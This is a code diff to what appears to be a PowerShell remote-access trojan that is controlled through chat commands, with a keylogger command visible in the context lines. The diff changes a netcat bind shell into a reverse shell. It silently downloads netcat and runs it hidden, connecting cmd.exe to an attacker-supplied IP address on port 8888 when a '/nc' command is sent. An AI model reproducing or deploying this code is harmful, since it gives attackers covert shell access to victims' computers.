@@ -519,7 +519,7 @@ public static void SwitchRightVirtualDesktopInWin10()
     Remove-Item "C:\Users\$env:username\Downloads\w_files.zip"
 }
 
-function netcat {
+function netcat($ip) {
     Send-Message "Downloading_netcat.."
     $url = "https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip"
     $outpath = "C:\Users\$env:username\Documents\nc.zip"
@@ -529,12 +529,12 @@ function netcat {
     
     Start-Sleep -Seconds 5
     Expand-Archive $outpath -DestinationPath $outpathUnzip
-    $args = "-lp 8888 -v -e cmd.exe"
+    $args = "$ip 8888 -e cmd.exe"
     $netcat = $outpathUnzip+"\nc.exe"
 
     Start-Sleep -Seconds 5
-    Send-Message "Listening.."
-    Send-Message "IP:$ipV4"
+    Send-Message "Connecting.."
+    Send-Message "IP:$ip"
     Send-Message "Port:8888"
     Start-Process $netcat -ArgumentList $args -WindowStyle Hidden
 }
@@ -727,8 +727,9 @@ While ($DoNotExit)  {
         $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
         keylogger seconds $time
       }
-      "/nc $ipV4"{
-        netcat
+      "/nc $ipV4 *"{
+        $ip = ($LastMessageText -split ("/nc $ipV4 "))[1]
+        netcat $ip
       }
       "/stopnc $ipV4"{
         stopnetcat
